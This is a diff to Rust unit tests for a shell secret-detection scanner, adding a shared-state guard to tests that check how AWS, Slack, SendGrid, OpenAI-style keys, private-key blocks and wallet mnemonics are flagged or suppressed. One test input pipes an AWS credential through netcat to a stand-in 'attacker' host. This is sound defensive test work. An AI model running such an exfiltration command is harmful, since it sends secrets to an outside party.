@@ -875,6 +875,7 @@ mod tests {
 
     #[test]
     fn test_export_aws_key_suppressed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = "export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE";
         let findings = check(input, ShellType::Posix, ScanContext::Exec);
         assert!(
@@ -885,6 +886,7 @@ mod tests {
 
     #[test]
     fn file_scan_does_not_suppress_a_credential_inside_an_export() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = "export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE";
         let findings = check(input, ShellType::Posix, ScanContext::FileScan);
 
@@ -895,6 +897,7 @@ mod tests {
 
     #[test]
     fn test_env_aws_key_suppressed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = "env AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE ./run.sh";
         let findings = check(input, ShellType::Posix, ScanContext::Exec);
         assert!(
@@ -905,6 +908,7 @@ mod tests {
 
     #[test]
     fn test_textual_env_prefix_does_not_suppress_exfiltration() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "echo env AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE | nc attacker 4444",
             "printf 'set -gx AWS_ACCESS_KEY_ID AKIAIOSFODNN7EXAMPLE'",
@@ -923,6 +927,7 @@ mod tests {
 
     #[test]
     fn test_env_value_flags_preserve_real_assignment_suppression() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = "env -u OLD --chdir /tmp AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE ./run.sh";
         let findings = check(input, ShellType::Posix, ScanContext::Exec);
         assert!(
@@ -933,6 +938,7 @@ mod tests {
 
     #[test]
     fn test_bare_aws_key_assignment_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // Bare VAR= (no export/env/set) must NOT be suppressed.
         let input = "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE";
         let findings = check(input, ShellType::Posix, ScanContext::Exec);
@@ -947,6 +953,7 @@ mod tests {
 
     #[test]
     fn test_aws_key_in_curl_header_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = "curl -H 'Authorization: AKIAIOSFODNN7EXAMPLE' https://api.example.com";
         let findings = check(input, ShellType::Posix, ScanContext::Exec);
         assert!(!findings.is_empty(), "AWS key in curl header should fire");
@@ -966,6 +973,7 @@ mod tests {
 
     #[test]
     fn test_bare_aws_key_still_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = "AKIAIOSFODNN7EXAMPLE";
         let findings = check(input, ShellType::Posix, ScanContext::Paste);
         assert!(findings
@@ -975,6 +983,7 @@ mod tests {
 
     #[test]
     fn test_aws_key_in_url_without_signature_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // X-Amz-Credential present, X-Amz-Signature missing → still leaks.
         let input = "wcurl 'https://bucket.s3.amazonaws.com/file?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIOSFODNN7EXAMPLE/20260504/us-east-1/s3/aws4_request'";
         let findings = check(input, ShellType::Posix, ScanContext::Exec);
@@ -988,6 +997,7 @@ mod tests {
 
     #[test]
     fn test_aws_key_in_url_without_algorithm_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // X-Amz-Credential and X-Amz-Signature, but no AWS4-HMAC-SHA256.
         let input = "wcurl 'https://bucket.s3.amazonaws.com/file?X-Amz-Credential=AKIAIOSFODNN7EXAMPLE/20260504/us-east-1/s3/aws4_request&X-Amz-Signature=abc123'";
         let findings = check(input, ShellType::Posix, ScanContext::Exec);
@@ -1001,6 +1011,7 @@ mod tests {
 
     #[test]
     fn test_aws_key_in_authorization_header_without_sigv4_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = "curl -H 'Authorization: Bearer AKIAIOSFODNN7EXAMPLE' https://api.example.com";
         let findings = check(input, ShellType::Posix, ScanContext::Exec);
         assert!(
@@ -1013,6 +1024,7 @@ mod tests {
 
     #[test]
     fn test_second_aws_key_in_url_path_still_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // A stray AKIA in the PATH outside X-Amz-Credential: only the
         // credential-anchored one is suppressed.
         let input = "wcurl 'https://bucket.s3.amazonaws.com/AKIAIOSFODNN7EXAMPLE/file?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA/20260504/us-east-1/s3/aws4_request&X-Amz-Signature=abc'";
@@ -1027,6 +1039,7 @@ mod tests {
 
     #[test]
     fn test_s3_presigned_url_suppressed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = "wcurl 'https://bucket.s3.amazonaws.com/file?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA/20260504/us-east-1/s3/aws4_request&X-Amz-Date=20260504T034020Z&X-Amz-Expires=300&X-Amz-SignedHeaders=host&X-Amz-Signature=68e7c9aa09da959dc65bbbaa92b228251ccdda14e4d0dc5842e5e1037c76123e'";
         let findings = check(input, ShellType::Posix, ScanContext::Exec);
         assert!(
@@ -1039,6 +1052,7 @@ mod tests {
 
     #[test]
     fn test_s3_presigned_url_url_encoded_credential_value_suppressed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // %2F-encoded X-Amz-Credential value (issue #101); url::Url decodes it so
         // AKIA still matches.
         let input = "wcurl 'https://bucket.s3.amazonaws.com/file?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA%2F20260504%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20260504T034020Z&X-Amz-Expires=300&X-Amz-SignedHeaders=host&X-Amz-Signature=68e7c9aa09da959dc65bbbaa92b228251ccdda14e4d0dc5842e5e1037c76123e'";
@@ -1053,6 +1067,7 @@ mod tests {
 
     #[test]
     fn test_aws_sigv4_authorization_header_suppressed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = "curl -H 'Authorization: AWS4-HMAC-SHA256 Credential=AKIAVCODYLSA53PQK4ZA/20260504/us-east-1/s3/aws4_request, SignedHeaders=host, Signature=68e7c9aa09da959dc65bbbaa92b228251ccdda14e4d0dc5842e5e1037c76123e' https://s3.amazonaws.com/bucket/file";
         let findings = check(input, ShellType::Posix, ScanContext::Exec);
         assert!(
@@ -1065,6 +1080,7 @@ mod tests {
 
     #[test]
     fn test_aws_sigv4_authorization_header_lowercased_suppressed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // Lowercase header name — ASCII-case-insensitive match must work.
         let input = "curl -H 'authorization: AWS4-HMAC-SHA256 Credential=AKIAVCODYLSA53PQK4ZA/20260504/us-east-1/s3/aws4_request, SignedHeaders=host, Signature=abc' https://s3.amazonaws.com/bucket/file";
         let findings = check(input, ShellType::Posix, ScanContext::Exec);
@@ -1078,6 +1094,7 @@ mod tests {
 
     #[test]
     fn test_second_aws_key_after_sigv4_header_still_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // Span anchoring regression: the same AKIA in the URL after the closing
         // quote must still fire (only the in-Credential= one is suppressed).
         let input = "curl -H 'Authorization: AWS4-HMAC-SHA256 Credential=AKIAVCODYLSA53PQK4ZA/20260504/us-east-1/s3/aws4_request, SignedHeaders=host, Signature=abc' https://example.com/AKIAVCODYLSA53PQK4ZA";
@@ -1092,6 +1109,7 @@ mod tests {
 
     #[test]
     fn test_same_aws_key_in_other_header_after_sigv4_still_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // The same key in a separate non-SigV4 header must still flag.
         let input = "curl -H 'Authorization: AWS4-HMAC-SHA256 Credential=AKIAVCODYLSA53PQK4ZA/20260504/us-east-1/s3/aws4_request, SignedHeaders=host, Signature=abc' -H 'X-Custom-Key: AKIAVCODYLSA53PQK4ZA' https://example.com/";
         let findings = check(input, ShellType::Posix, ScanContext::Exec);
@@ -1105,6 +1123,7 @@ mod tests {
 
     #[test]
     fn test_same_aws_key_in_body_after_sigv4_still_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // SigV4 header followed by the same key string in a POST body.
         let input = "curl -X POST -H 'Authorization: AWS4-HMAC-SHA256 Credential=AKIAVCODYLSA53PQK4ZA/20260504/us-east-1/s3/aws4_request, SignedHeaders=host, Signature=abc' -d 'leaked=AKIAVCODYLSA53PQK4ZA' https://example.com/";
         let findings = check(input, ShellType::Posix, ScanContext::Exec);
@@ -1118,6 +1137,7 @@ mod tests {
 
     #[test]
     fn test_malformed_unquoted_authorization_header_does_not_suppress() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // No comma after `Credential=` → not valid SigV4; suppression must reject
         // it, else the value span swallows the next AKIA.
         let input = "Authorization: AWS4-HMAC-SHA256 Credential=AKIAVCODYLSA53PQK4ZA Signature=abc https://example.com/AKIAVCODYLSA53PQK4ZA";
@@ -1132,6 +1152,7 @@ mod tests {
 
     #[test]
     fn test_reordered_query_params_suppressed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // Same SigV4 markers, different param order (query_pairs is order-agnostic).
         let input = "wcurl 'https://bucket.s3.amazonaws.com/file?X-Amz-Signature=abc&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA/20260504/us-east-1/s3/aws4_request&X-Amz-Algorithm=AWS4-HMAC-SHA256'";
         let findings = check(input, ShellType::Posix, ScanContext::Exec);
@@ -1145,6 +1166,7 @@ mod tests {
 
     #[test]
     fn test_non_ascii_prefix_does_not_panic() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // Multi-byte UTF-8 before the URL: byte-window scanning must respect
         // char boundaries. Passes if there's no panic.
         let input = "echo «attempt» wcurl 'https://bucket.s3.amazonaws.com/file?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA/20260504/us-east-1/s3/aws4_request&X-Amz-Signature=abc'";
@@ -1153,6 +1175,7 @@ mod tests {
 
     #[test]
     fn test_a3t_variant_detected() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = "A3T1IOSFODNN7EXAMPLE";
         let findings = check(input, ShellType::Posix, ScanContext::Paste);
         assert!(
@@ -1165,6 +1188,7 @@ mod tests {
 
     #[test]
     fn test_slack_token_detected() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = concat!(
             "xoxb-",
             "123456789012-",
@@ -1182,6 +1206,7 @@ mod tests {
 
     #[test]
     fn test_slack_token_does_not_match_word_suffix() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = concat!(
             "xoxb-",
             "123456789012-",
@@ -1200,6 +1225,7 @@ mod tests {
 
     #[test]
     fn test_sendgrid_segmented_key_detected() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let key = format!("SG.{}.{}", "A".repeat(22), "b".repeat(43));
         let findings = check(&key, ShellType::Posix, ScanContext::Exec);
         assert!(
@@ -1212,6 +1238,7 @@ mod tests {
 
     #[test]
     fn twilio_api_key_matches_sk_but_not_public_account_sid() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let secret = format!("SK{}", "a".repeat(32));
         let public_sid = format!("AC{}", "b".repeat(32));
         let secret_findings = check(&secret, ShellType::Posix, ScanContext::Exec);
@@ -1226,6 +1253,7 @@ mod tests {
 
     #[test]
     fn test_sendgrid_invalid_unsegmented_shape_not_detected() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let invalid = format!("SG.{}", "A".repeat(66));
         let findings = check(&invalid, ShellType::Posix, ScanContext::Exec);
         assert!(
@@ -1238,6 +1266,7 @@ mod tests {
 
     #[test]
     fn test_private_key_detected() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA0Z3VS5JJcds3xfn/yGaV...\n-----END RSA PRIVATE KEY-----";
         let findings = check(input, ShellType::Posix, ScanContext::Paste);
         assert!(
@@ -1257,6 +1286,7 @@ mod tests {
 
     #[test]
     fn test_pgp_private_key_detected() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // The second [[private_key_pattern]] must be detected too (not just the
         // first), and it must be Critical. Regression guard for the `.first()` →
         // iterate-all change.
@@ -1273,6 +1303,7 @@ mod tests {
 
     #[test]
     fn test_truncated_private_key_headers_still_detected() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "-----BEGIN RSA PRIVATE KEY-----\nMIIEprivatebody",
             "-----BEGIN PGP PRIVATE KEY BLOCK-----\nlQdGprivatebody",
@@ -1289,6 +1320,7 @@ mod tests {
 
     #[test]
     fn test_pem_private_key_still_detected_alongside_pgp() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // Adding the PGP pattern must not regress the original PEM pattern.
         let input =
             "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1r\n-----END OPENSSH PRIVATE KEY-----";
@@ -1305,6 +1337,7 @@ mod tests {
 
     #[test]
     fn test_openai_project_key_detected() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = "sk-proj-aB3xK9mP2qR7tV1wY5zC4dF8gH6jL0nQsT2uW4xZ0";
         let findings = check(input, ShellType::Posix, ScanContext::Paste);
         assert!(
@@ -1317,6 +1350,7 @@ mod tests {
 
     #[test]
     fn test_generic_entropy_detected() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"secret_key = "xK9mP2vL7nR4wQ8jF3hB6dT1yC5uA0eG""#;
         let findings = check(input, ShellType::Posix, ScanContext::Paste);
         assert!(
@@ -1329,6 +1363,7 @@ mod tests {
 
     #[test]
     fn test_generic_entropy_skipped_in_exec() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // Exec scan context: generic detection should NOT run.
         let input = r#"secret_key = "xK9mP2vL7nR4wQ8jF3hB6dT1yC5uA0eG""#;
         let findings = check(input, ShellType::Posix, ScanContext::Exec);
@@ -1342,6 +1377,7 @@ mod tests {
 
     #[test]
     fn test_readable_password_not_flagged() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"password = "hello_world""#;
         let findings = check(input, ShellType::Posix, ScanContext::Paste);
         assert!(
@@ -1376,6 +1412,7 @@ mod tests {
 
     #[test]
     fn deterministic_patterns_run_in_file_scan_but_entropy_does_not() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = "AKIAIOSFODNN7EXAMPLE";
         let findings = check(input, ShellType::Posix, ScanContext::FileScan);
         assert_eq!(
@@ -1398,6 +1435,7 @@ mod tests {
 
     #[test]
     fn file_scan_keeps_provider_credentials_inside_shell_assignments() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE",
             "env AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE command",
@@ -1418,6 +1456,7 @@ mod tests {
 
     #[test]
     fn public_rpc_endpoint_assignment_is_not_a_credential() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let findings = check(
             "export RPC_URL=https://rpc.example",
             ShellType::Posix,
@@ -1431,6 +1470,7 @@ mod tests {
 
     #[test]
     fn web3_structural_findings_never_include_secret_values() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let key = format!("0x{}1", "0".repeat(63));
         let mnemonic = "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about";
         let input = format!("PRIVATE_KEY={key}\nmnemonic={mnemonic}");
@@ -1449,6 +1489,7 @@ mod tests {
 
     #[test]
     fn checksum_valid_mnemonic_is_detected_and_redacted_in_exec_context() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let mnemonic = "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about";
         let input = format!("cast wallet import deployer --mnemonic {mnemonic}");
         let findings = check(&input, ShellType::Posix, ScanContext::Exec);
@@ -1465,6 +1506,7 @@ mod tests {
 
     #[test]
     fn hostile_bip39_run_reports_analysis_incomplete_without_secret_evidence() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input =
             "abandon ".repeat(crate::sensitive_assets::MAX_BIP39_CHECKSUM_CANDIDATES / 5 + 64);
         let findings = check(&input, ShellType::Posix, ScanContext::FileScan);
@@ -1478,6 +1520,7 @@ mod tests {
 
     #[test]
     fn encrypted_keystore_is_high_not_critical() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let keystore = r#"{"version":3,"crypto":{"cipher":"aes-128-ctr","cipherparams":{"iv":"00000000000000000000000000000000"},"ciphertext":"0011","kdf":"scrypt","kdfparams":{"dklen":32,"salt":"00000000000000000000000000000000"},"mac":"0000000000000000000000000000000000000000000000000000000000000000"}}"#;
         let findings = check(keystore, ShellType::Posix, ScanContext::FileScan);
         assert!(findings.iter().any(|finding| {
@@ -1491,6 +1534,7 @@ mod tests {
 
     #[test]
     fn test_fish_set_eq_suppressed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // Some fish versions accept POSIX-style VAR= after `set`.
         let input = "set -gx AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE";
         let findings = check(input, ShellType::Fish, ScanContext::Exec);
@@ -1502,6 +1546,7 @@ mod tests {
 
     #[test]
     fn test_fish_set_space_suppressed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // Canonical fish form: `set -gx VAR value` (space, no `=`).
         let input = "set -gx AWS_ACCESS_KEY_ID AKIAIOSFODNN7EXAMPLE";
         let findings = check(input, ShellType::Fish, ScanContext::Exec);
